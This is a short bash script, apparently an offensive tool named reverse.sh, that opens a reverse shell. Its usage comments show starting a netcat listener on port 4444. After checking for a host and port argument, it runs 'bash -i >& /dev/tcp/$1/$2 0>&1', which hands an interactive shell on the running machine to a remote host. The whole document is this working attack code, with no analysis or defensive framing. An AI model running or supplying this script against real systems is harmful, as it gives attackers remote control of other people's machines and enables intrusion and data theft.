#!/bin/bash
# Author: yulibao
# Script: Bind a local shell to a remote listening

# Usage:
# Start remote listening may be like this: 
#   nc -lvvp 4444
# and connect to ir by:
# ./reverse.sh <remote_host> 4444

if [ ! -n "$1" ]; then
    echo "Error: no target address"
    exit 1
fi

if [ ! -n "$2" ]; then
    echo "Error: no target port"
    exit 1
fi

bash -i >& /dev/tcp/$1/$2 0>&1